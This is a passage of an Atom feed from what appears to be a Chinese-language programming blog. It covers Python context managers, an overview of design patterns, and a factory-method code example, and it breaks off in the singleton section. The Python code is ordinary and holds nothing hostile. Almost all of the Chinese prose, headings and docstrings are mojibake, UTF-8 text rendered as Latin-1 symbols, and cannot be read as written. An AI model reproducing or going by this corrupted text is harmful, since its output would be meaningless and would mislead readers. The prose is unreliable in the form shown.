å¦‚æœå‡ºç°äº†å¼‚å¸¸ï¼Œå¼‚å¸¸ä¼šåœ¨<code>yield</code>è¯­å¥é‚£é‡ŒæŠ›å‡ºã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœè¦å†™ä¸€ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œä½ éœ€è¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ª<code>__enter__()</code>å’Œä¸€ä¸ª<code>__exit__()</code>æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">timethis</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, label)</span>:</span></span><br><span class="line">        self.label = label</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_ty, exc_val, exc_tb)</span>:</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(self.label, end - self.start))</span><br></pre></td></tr></table></figure><p><code>@contextmanager</code>åº”è¯¥ä»…ä»…ç”¨æ¥å†™è‡ªåŒ…å«çš„ä¸Šä¸‹æ–‡ç®¡ç†å‡½æ•°ã€‚å¦‚æœä½ æœ‰ä¸€äº›å¯¹è±¡(æ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶ã€ç½‘ç»œè¿æ¥æˆ–é”)ï¼Œéœ€è¦æ”¯æŒ<code>with</code>è¯­å¥ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦å•ç‹¬å®ç° <code>__enter__()</code>æ–¹æ³•å’Œ<code>__exit__()</code>æ–¹æ³•ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å…ƒç¼–ç¨‹&quot;&gt;&lt;a href=&quot;#å…ƒç¼–ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;å…ƒç¼–ç¨‹&quot;&gt;&lt;/a&gt;å…ƒç¼–ç¨‹&lt;/h3&gt;&lt;h4 id=&quot;åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨&quot;&gt;&lt;a href=&quot;#åœ¨å‡½æ•°ä¸Šæ·»åŠ åŒ…è£…å™¨&quot; class=&quot;headerlink&quot; title=&quot;åœ¨å‡½æ•°
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PythonDesignPatterns</title>
    <link href="elssm.github.io/2023/10/14/PythonDesignPatterns/"/>
    <id>elssm.github.io/2023/10/14/PythonDesignPatterns/</id>
    <published>2023-10-14T06:45:01.000Z</published>
    <updated>2023-10-14T06:45:37.496Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å­¦ä¹ <code>Python</code>è®¾è®¡æ¨¡å¼ã€‚</p><h3 id="è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ"><a href="#è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ" class="headerlink" title="è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ"></a>è®¾è®¡æ¨¡å¼æ˜¯ä»€ä¹ˆ</h3><p>è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶è®¾è®¡ä¸­å¸¸è§é—®é¢˜çš„å…¸å‹è§£å†³æ–¹æ¡ˆã€‚ å®ƒä»¬å°±åƒèƒ½æ ¹æ®éœ€æ±‚è¿›è¡Œè°ƒæ•´çš„é¢„åˆ¶è“å›¾ï¼Œ å¯ç”¨äºè§£å†³ä»£ç ä¸­åå¤å‡ºç°çš„è®¾è®¡é—®é¢˜ã€‚</p><p>è®¾è®¡æ¨¡å¼ä¸æ–¹æ³•æˆ–åº“çš„ä½¿ç”¨æ–¹å¼ä¸åŒï¼Œ ä½ å¾ˆéš¾ç›´æ¥åœ¨è‡ªå·±çš„ç¨‹åºä¸­å¥—ç”¨æŸä¸ªè®¾è®¡æ¨¡å¼ã€‚ æ¨¡å¼å¹¶ä¸æ˜¯ä¸€æ®µç‰¹å®šçš„ä»£ç ï¼Œ è€Œæ˜¯è§£å†³ç‰¹å®šé—®é¢˜çš„ä¸€èˆ¬æ€§æ¦‚å¿µã€‚ ä½ å¯ä»¥æ ¹æ®æ¨¡å¼æ¥å®ç°ç¬¦åˆè‡ªå·±ç¨‹åºå®é™…æ‰€éœ€çš„è§£å†³æ–¹æ¡ˆã€‚</p><p>äººä»¬å¸¸å¸¸ä¼šæ··æ·†æ¨¡å¼å’Œç®—æ³•ï¼Œ å› ä¸ºä¸¤è€…åœ¨æ¦‚å¿µä¸Šéƒ½æ˜¯å·²çŸ¥ç‰¹å®šé—®é¢˜çš„å…¸å‹è§£å†³æ–¹æ¡ˆã€‚ ä½†ç®—æ³•æ€»æ˜¯æ˜ç¡®å®šä¹‰è¾¾æˆç‰¹å®šç›®æ ‡æ‰€éœ€çš„ä¸€ç³»åˆ—æ­¥éª¤ï¼Œ è€Œæ¨¡å¼åˆ™æ˜¯å¯¹è§£å†³æ–¹æ¡ˆçš„æ›´é«˜å±‚æ¬¡æè¿°ã€‚ åŒä¸€æ¨¡å¼åœ¨ä¸¤ä¸ªä¸åŒç¨‹åºä¸­çš„å®ç°ä»£ç å¯èƒ½ä¼šä¸ä¸€æ ·ã€‚</p><p>ç®—æ³•æ›´åƒæ˜¯èœè°±ï¼š æä¾›è¾¾æˆç›®æ ‡çš„æ˜ç¡®æ­¥éª¤ã€‚ è€Œæ¨¡å¼æ›´åƒæ˜¯è“å›¾ï¼š ä½ å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„ç»“æœå’Œæ¨¡å¼çš„åŠŸèƒ½ï¼Œ ä½†éœ€è¦è‡ªå·±ç¡®å®šå®ç°æ­¥éª¤ã€‚</p><h3 id="è®¾è®¡æ¨¡å¼çš„ä¼˜åŠ¿"><a href="#è®¾è®¡æ¨¡å¼çš„ä¼˜åŠ¿" class="headerlink" title="è®¾è®¡æ¨¡å¼çš„ä¼˜åŠ¿"></a>è®¾è®¡æ¨¡å¼çš„ä¼˜åŠ¿</h3><ul><li>è®¾è®¡æ¨¡å¼æ˜¯é’ˆå¯¹è½¯ä»¶è®¾è®¡ä¸­å¸¸è§é—®é¢˜çš„å·¥å…·ç®±ï¼Œ å…¶ä¸­çš„å·¥å…·å°±æ˜¯å„ç§ç»è¿‡å®è·µéªŒè¯çš„è§£å†³æ–¹æ¡ˆã€‚ å³ä½¿ä½ ä»æœªé‡åˆ°è¿‡è¿™äº›é—®é¢˜ï¼Œ äº†è§£æ¨¡å¼ä»ç„¶éå¸¸æœ‰ç”¨ï¼Œ å› ä¸ºå®ƒèƒ½æŒ‡å¯¼ä½ å¦‚ä½•ä½¿ç”¨é¢å‘å¯¹è±¡çš„è®¾è®¡åŸåˆ™æ¥è§£å†³å„ç§é—®é¢˜ã€‚</li><li>è®¾è®¡æ¨¡å¼å®šä¹‰äº†ä¸€ç§è®©ä½ å’Œå›¢é˜Ÿæˆå‘˜èƒ½å¤Ÿæ›´é«˜æ•ˆæ²Ÿé€šçš„é€šç”¨è¯­è¨€ã€‚ ä½ åªéœ€è¯´ â€œå“¦ï¼Œ è¿™é‡Œç”¨å•ä¾‹å°±å¯ä»¥äº†â€ï¼Œ æ‰€æœ‰äººéƒ½ä¼šç†è§£è¿™æ¡å»ºè®®èƒŒåçš„æƒ³æ³•ã€‚ åªè¦çŸ¥æ™“æ¨¡å¼åŠå…¶åç§°ï¼Œ ä½ å°±æ— éœ€è§£é‡Šä»€ä¹ˆæ˜¯å•ä¾‹ã€‚</li></ul><h3 id="è®¾è®¡æ¨¡å¼çš„åˆ†ç±»"><a href="#è®¾è®¡æ¨¡å¼çš„åˆ†ç±»" class="headerlink" title="è®¾è®¡æ¨¡å¼çš„åˆ†ç±»"></a>è®¾è®¡æ¨¡å¼çš„åˆ†ç±»</h3><p>ä¸åŒè®¾è®¡æ¨¡å¼çš„å¤æ‚ç¨‹åº¦ã€ ç»†èŠ‚å±‚æ¬¡ä»¥åŠåœ¨æ•´ä¸ªç³»ç»Ÿä¸­çš„åº”ç”¨èŒƒå›´ç­‰æ–¹é¢å„ä¸ç›¸åŒã€‚ æˆ‘å–œæ¬¢å°†å…¶ç±»æ¯”äºé“è·¯çš„å»ºé€ ï¼š å¦‚æœä½ å¸Œæœ›è®©åå­—è·¯å£æ›´åŠ å®‰å…¨ï¼Œ é‚£ä¹ˆå¯ä»¥å®‰è£…ä¸€äº›äº¤é€šä¿¡å·ç¯ï¼Œ æˆ–è€…ä¿®å»ºåŒ…å«è¡Œäººåœ°ä¸‹é€šé“åœ¨å†…çš„å¤šå±‚äº’é€šå¼ç«‹äº¤æ¡¥ã€‚</p><p>æœ€åŸºç¡€çš„ã€ åº•å±‚çš„æ¨¡å¼é€šå¸¸è¢«ç§°ä¸ºæƒ¯ç”¨æŠ€å·§ã€‚ è¿™ç±»æ¨¡å¼ä¸€èˆ¬åªèƒ½åœ¨ä¸€ç§ç¼–ç¨‹è¯­è¨€ä¸­ä½¿ç”¨ã€‚</p><p>æœ€é€šç”¨çš„ã€ é«˜å±‚çš„æ¨¡å¼æ˜¯æ„æ¶æ¨¡å¼ã€‚ å¼€å‘è€…å¯ä»¥åœ¨ä»»ä½•ç¼–ç¨‹è¯­è¨€ä¸­ä½¿ç”¨è¿™ç±»æ¨¡å¼ã€‚ ä¸å…¶ä»–æ¨¡å¼ä¸åŒï¼Œ å®ƒä»¬å¯ç”¨äºæ•´ä¸ªåº”ç”¨ç¨‹åºçš„æ¶æ„è®¾è®¡ã€‚</p><p>æ­¤å¤–ï¼Œ æ‰€æœ‰æ¨¡å¼å¯ä»¥æ ¹æ®å…¶æ„å›¾æˆ–ç›®çš„æ¥åˆ†ç±»ã€‚ä»¥ä¸‹åˆ†ä¸ºä¸‰ç±»ï¼š</p><ul><li>åˆ›å»ºå‹æ¨¡å¼ï¼šæä¾›åˆ›å»ºå¯¹è±¡çš„æœºåˆ¶ï¼Œ å¢åŠ å·²æœ‰ä»£ç çš„çµæ´»æ€§å’Œå¯å¤ç”¨æ€§ã€‚</li><li>ç»“æ„æ€§æ¨¡å¼ï¼šä»‹ç»å¦‚ä½•å°†å¯¹è±¡å’Œç±»ç»„è£…æˆè¾ƒå¤§çš„ç»“æ„ï¼Œ å¹¶åŒæ—¶ä¿æŒç»“æ„çš„çµæ´»å’Œé«˜æ•ˆã€‚</li><li>è¡Œä¸ºæ¨¡å¼ï¼šè´Ÿè´£å¯¹è±¡é—´çš„é«˜æ•ˆæ²Ÿé€šå’ŒèŒè´£å§”æ´¾ã€‚</li></ul><h3 id="åˆ›å»ºå‹æ¨¡å¼"><a href="#åˆ›å»ºå‹æ¨¡å¼" class="headerlink" title="åˆ›å»ºå‹æ¨¡å¼"></a>åˆ›å»ºå‹æ¨¡å¼</h3><h4 id="å·¥å‚æ–¹æ³•æ¨¡å¼"><a href="#å·¥å‚æ–¹æ³•æ¨¡å¼" class="headerlink" title="å·¥å‚æ–¹æ³•æ¨¡å¼"></a>å·¥å‚æ–¹æ³•æ¨¡å¼</h4><h5 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h5><p>å·¥å‚æ–¹æ³•æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œå…¶åœ¨çˆ¶ç±»ä¸­æä¾›ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ–¹æ³•ï¼Œå…è®¸å­ç±»å†³å®šå®ä¾‹åŒ–å¯¹è±¡çš„ç±»å‹ã€‚</p><h5 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h5><p>å‡è®¾ä½ æ­£åœ¨å¼€å‘ä¸€æ¬¾ç‰©æµç®¡ç†åº”ç”¨ã€‚æœ€åˆç‰ˆæœ¬åªèƒ½å¤„ç†å¡è½¦è¿è¾“ï¼Œ å› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½åœ¨ä½äºåä¸º<code>å¡è½¦</code>çš„ç±»ä¸­ã€‚ä¸€æ®µæ—¶é—´åï¼Œ è¿™æ¬¾åº”ç”¨å˜å¾—æå—æ¬¢è¿ã€‚å®¢æˆ·å¸Œæœ›åº”ç”¨èƒ½å¤Ÿæ”¯æŒæµ·ä¸Šç‰©æµåŠŸèƒ½ã€‚ç„¶è€Œç›®å‰å¤§éƒ¨åˆ†ä»£ç éƒ½ä¸<code>å¡è½¦</code>ç±»ç›¸å…³ï¼Œåœ¨ç¨‹åºä¸­æ·»åŠ <code>è½®èˆ¹</code>ç±»éœ€è¦ä¿®æ”¹å…¨éƒ¨ä»£ç ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ï¼Œ å¦‚æœä½ ä»¥åéœ€è¦åœ¨ç¨‹åºä¸­æ”¯æŒå¦å¤–ä¸€ç§è¿è¾“æ–¹å¼ï¼Œ å¾ˆå¯èƒ½éœ€è¦å†æ¬¡å¯¹è¿™äº›ä»£ç è¿›è¡Œå¤§å¹…ä¿®æ”¹ã€‚æ­¤æ—¶æˆ‘ä»¬åº”è¯¥å¦‚ä½•å¤„ç†è¿™ç§é—®é¢˜å‘¢ï¼Ÿ</p><h5 id="æ–¹æ¡ˆ"><a href="#æ–¹æ¡ˆ" class="headerlink" title="æ–¹æ¡ˆ"></a>æ–¹æ¡ˆ</h5><p>å·¥å‚æ–¹æ³•æ¨¡å¼å»ºè®®ä½¿ç”¨ç‰¹æ®Šçš„å·¥å‚æ–¹æ³•ä»£æ›¿å¯¹äºå¯¹è±¡æ„é€ å‡½æ•°çš„ç›´æ¥è°ƒç”¨ ï¼ˆå³ä½¿ç”¨<code>new</code>è¿ç®—ç¬¦ï¼‰ã€‚å¯¹è±¡ä»å°†é€šè¿‡<code>new</code>è¿ç®—ç¬¦åˆ›å»ºï¼Œ åªæ˜¯è¯¥è¿ç®—ç¬¦æ”¹åœ¨å·¥å‚æ–¹æ³•ä¸­è°ƒç”¨ç½¢äº†ã€‚ å·¥å‚æ–¹æ³•è¿”å›çš„å¯¹è±¡é€šå¸¸è¢«ç§°ä½œ â€œäº§å“â€ã€‚</p><p>ä¹çœ‹ä¹‹ä¸‹ï¼Œè¿™ç§æ›´æ”¹å¯èƒ½æ¯«æ— æ„ä¹‰ï¼šæˆ‘ä»¬åªæ˜¯æ”¹å˜äº†ç¨‹åºä¸­è°ƒç”¨æ„é€ å‡½æ•°çš„ä½ç½®è€Œå·²ã€‚ä½†æ˜¯ï¼Œä»”ç»†æƒ³ä¸€ä¸‹ï¼Œç°åœ¨ä½ å¯ä»¥åœ¨å­ç±»ä¸­é‡å†™å·¥å‚æ–¹æ³•ï¼Œä»è€Œæ”¹å˜å…¶åˆ›å»ºäº§å“çš„ç±»å‹ã€‚ä½†æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„:ä»…å½“è¿™äº›äº§å“å…·æœ‰å…±åŒçš„åŸºç±»æˆ–è€…æ¥å£æ—¶ï¼Œå­ç±»æ‰èƒ½è¿”å›ä¸åŒç±»å‹çš„äº§å“ï¼ŒåŒæ—¶åŸºç±»ä¸­çš„å·¥å‚æ–¹æ³•è¿˜åº”å°†å…¶è¿”å›ç±»å‹å£°æ˜ä¸ºè¿™ä¸€å…±æœ‰æ¥å£ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œâ€‹å¡è½¦<code>Truck</code>å’Œè½®èˆ¹<code>Ship</code>ç±»éƒ½å¿…é¡»å®ç°è¿è¾“<code>Transport</code>æ¥å£ï¼Œè¯¥æ¥å£å£°æ˜äº†ä¸€ä¸ªåä¸º<code>deliver</code>äº¤ä»˜çš„æ–¹æ³•ã€‚ æ¯ä¸ªç±»éƒ½å°†ä»¥ä¸åŒçš„æ–¹å¼å®ç°è¯¥æ–¹æ³•ï¼šå¡è½¦èµ°é™†è·¯äº¤ä»˜è´§ç‰©ï¼Œè½®èˆ¹èµ°æµ·è·¯äº¤ä»˜è´§ç‰©ã€‚ â€‹é™†è·¯è¿è¾“<code>RoadÂ­Logistics</code>ç±»ä¸­çš„å·¥å‚æ–¹æ³•è¿”å›å¡è½¦å¯¹è±¡ï¼Œè€Œæµ·è·¯è¿è¾“<code>SeaÂ­Logistics</code>ç±»åˆ™è¿”å›è½®èˆ¹å¯¹è±¡ã€‚</p><p>è°ƒç”¨å·¥å‚æ–¹æ³•çš„ä»£ç ï¼ˆé€šå¸¸è¢«ç§°ä¸ºå®¢æˆ·ç«¯ä»£ç ï¼‰æ— éœ€äº†è§£ä¸åŒå­ç±»è¿”å›å®é™…å¯¹è±¡ä¹‹é—´çš„å·®åˆ«ã€‚å®¢æˆ·ç«¯å°†æ‰€æœ‰äº§å“è§†ä¸ºæŠ½è±¡çš„è¿è¾“ã€‚å®¢æˆ·ç«¯çŸ¥é“æ‰€æœ‰è¿è¾“å¯¹è±¡éƒ½æä¾›äº¤ä»˜æ–¹æ³•ï¼Œä½†æ˜¯å¹¶ä¸å…³å¿ƒå…¶å…·ä½“å®ç°æ–¹å¼ã€‚</p><h5 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Creator</span><span class="params">(ABC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Creatorç±»å£°æ˜äº†å·¥å‚æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åº”è¯¥è¿”å›Productç±»çš„å¯¹è±¡ã€‚åˆ›å»ºè€…çš„å­ç±»é€šå¸¸æä¾›è¯¥æ–¹æ³•çš„å®ç°ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        è¯·æ³¨æ„ï¼ŒCreatorç±»è¿˜å¯èƒ½æä¾›å·¥å‚æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">some_operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">       è¿˜è¦æ³¨æ„ï¼ŒCreatorç±»çš„ä¸»è¦è´£ä»»ä¸æ˜¯åœ¨åˆ›å»ºäº§å“ã€‚é€šå¸¸ï¼Œå®ƒåŒ…å«ä¸€äº›æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä¾èµ–äºfactoryæ–¹æ³•</span></span><br><span class="line"><span class="string">       è¿”å›çš„Productå¯¹è±¡ã€‚å­ç±»å¯ä»¥é€šè¿‡é‡å†™å·¥å‚æ–¹æ³•ï¼Œå¹¶ä»ä¸­è¿”å›ä¸åŒç±»å‹çš„äº§å“ã€‚</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># è°ƒç”¨å·¥å‚æ–¹æ³•åˆ›å»ºä¸€ä¸ªProductå¯¹è±¡</span></span><br><span class="line">        product = self.factory_method()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨product.</span></span><br><span class="line">        result = <span class="string">f"Creator: The same creator's code has just worked with <span class="subst">&#123;product.operation()&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Concrete Creatorsè¦†ç›–factoryæ–¹æ³•ä»¥æ›´æ”¹ç”Ÿæˆçš„äº§å“ç±»å‹ã€‚</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteCreator1</span><span class="params">(Creator)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    æ³¨æ„ï¼Œè¯¥æ–¹æ³•çš„ç­¾åä»ç„¶ä½¿ç”¨æŠ½è±¡äº§å“ç±»å‹ï¼Œå³ä½¿å…·ä½“çš„äº§å“å®é™…ä¸Šæ˜¯ä»è¯¥æ–¹æ³•è¿”å›çš„ã€‚åˆ›å»ºè€…å¯ä»¥ä¿æŒç‹¬ç«‹äºå…·ä½“äº§å“ç±»çš„æ–¹å¼ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span> -&gt; Product:</span></span><br><span class="line">        <span class="keyword">return</span> ConcreteProduct1()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteCreator2</span><span class="params">(Creator)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span> -&gt; Product:</span></span><br><span class="line">        <span class="keyword">return</span> ConcreteProduct2()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span><span class="params">(ABC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Productæ¥å£å£°æ˜æ‰€æœ‰å…·ä½“äº§å“å¿…é¡»å®ç°ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Concrete Productsæä¾›äº†äº§å“ç•Œé¢çš„å„ç§å®ç°ã€‚</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteProduct1</span><span class="params">(Product)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;Result of the ConcreteProduct1&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteProduct2</span><span class="params">(Product)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;Result of the ConcreteProduct2&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_code</span><span class="params">(creator: Creator)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    å®¢æˆ·ç«¯ä»£ç ä¸å…·ä½“åˆ›å»ºè€…çš„å®ä¾‹ä¸€èµ·å·¥ä½œï¼Œå°½ç®¡æ˜¯é€šè¿‡å…¶åŸºæœ¬æ¥å£ã€‚åªè¦å®¢æˆ·ç«¯é€šè¿‡åŸºæœ¬æ¥å£ï¼Œå¯ä»¥å°†å…¶ä¼ é€’ç»™ä»»ä½•åˆ›å»ºè€…çš„å­ç±»ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">f"Client: I'm not aware of the creator's class, but it still works.\n"</span></span><br><span class="line">          <span class="string">f"<span class="subst">&#123;creator.some_operation()&#125;</span>"</span>, end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"App: Launched with the ConcreteCreator1."</span>)</span><br><span class="line">    client_code(ConcreteCreator1())</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"App: Launched with the ConcreteCreator2."</span>)</span><br><span class="line">    client_code(ConcreteCreator2())</span><br></pre></td></tr></table></figure><h4 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a href="#æŠ½è±¡å·¥å‚æ¨¡å¼" class="headerlink" title="æŠ½è±¡å·¥å‚æ¨¡å¼"></a>æŠ½è±¡å·¥å‚æ¨¡å¼</h4><p>ä»‹ç»ï¼šæŠ½è±¡å·¥å‚æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œå®ƒèƒ½åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³çš„å¯¹è±¡ï¼Œè€Œæ— éœ€æŒ‡å®šå…¶å…·ä½“ç±»ã€‚</p><h4 id="ç”Ÿæˆå™¨æ¨¡å¼"><a href="#ç”Ÿæˆå™¨æ¨¡å¼" class="headerlink" title="ç”Ÿæˆå™¨æ¨¡å¼"></a>ç”Ÿæˆå™¨æ¨¡å¼</h4><p>ä»‹ç»ï¼šå£°ç§°å…¶æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œä½¿ä½ èƒ½å¤Ÿåˆ†æ­¥éª¤åˆ›å»ºå¤æ‚å¯¹è±¡ï¼Œè¯¥æ¨¡å¼å…è®¸ä½ ä½¿ç”¨ç›¸åŒçš„åˆ›å»ºä»£ç ç”Ÿæˆä¸åŒç±»å‹å’Œå½¢å¼çš„å¯¹è±¡ã€‚</p><h4 id="åŸå‹æ¨¡å¼"><a href="#åŸå‹æ¨¡å¼" class="headerlink" title="åŸå‹æ¨¡å¼"></a>åŸå‹æ¨¡å¼</h4><p>ä»‹ç»ï¼šåŸå‹æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œä½¿ä½ èƒ½å¤Ÿå¤åˆ¶å·²æœ‰å¯¹è±¡ï¼Œè€Œåˆæ— éœ€ä½¿ä»£ç ä¾èµ–å®ƒä»¬æ‰€å±çš„ç±»ã€‚</p><h4 id="å•ä¾‹æ¨¡å¼"><a href="#å•ä¾‹æ¨¡å¼" class="headerlink" title="å•ä¾‹æ¨¡å¼"></a>å•ä¾‹æ¨¡å¼</h4><p>ä»‹ç»ï¼šå•ä¾‹æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œ è®©ä½ 